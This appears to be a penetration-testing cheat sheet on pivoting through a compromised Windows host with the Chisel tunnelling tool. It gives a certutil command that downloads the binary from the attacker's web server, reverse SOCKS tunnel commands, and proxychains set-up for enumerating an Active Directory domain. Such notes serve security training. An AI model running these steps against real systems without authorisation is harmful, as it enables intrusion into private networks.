--- ---

<h2>Top Commands</h2>

```Terminal
L --> Install Chisel (chisel_VERSION_linux_amd64.gz) ---> https://github.com/jpillora/chisel/releases/tag/v1.7.7

L --> Launch python webserver (sudo python3 -m http.server 80) and transfer the windows Chisel file to the target machine

W --> Install Chisel (chisel_VERSION_windows_386.gz (32 bits)) ---> https://github.com/jpillora/chisel/releases/tag/v1.7.7 (chose the 32 bits or 64 bits depending on the version of the windows machine)

W --> Download the Chisel file from the python server (certutil -urlcache -split -f http://IP/chisel.exe)

L --> Modify proxychain to receive the client socks traffic (sudo nano etc/proxychains4.conf) and coment the sock4 and write under (sock5 127.0.0.1 1080)

L --> Make the Chisel (Linux version) executable (chmod +x file)

L --> Launch Chisel server (./chisel server -p 8000 --reverse)

W --> Launch Chisel client (chisel client IP(Linux):8000 R:socks)

L --> Use proxychain before any comment to use the traffic from the target machine (EX: nmap to check the domain of this windows machine, etc...)
```

- **L**         ---> Attacking Machine (Linux)
- **W**       ---> Target Machine (Windows)

---

<h2>What is Chisel</h2>

Chisel let you connect to the target machine withc is part of an active directory and simply process the traffic via proxychain on the attacking machine. this let you then enumerate the target machine and also the domain associated with it trought your own linux machine.

- Original definition 
	- Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

Tutorial: https://youtu.be/dIqoULXmhXg
More information: https://github.com/jpillora/chisel

[![overview](https://camo.githubusercontent.com/6209fb99bc6edcb2341900468f78b09f03d0be74e03b48e49beb87c52b55362c/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230)](https://camo.githubusercontent.com/6209fb99bc6edcb2341900468f78b09f03d0be74e03b48e49beb87c52b55362c/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230)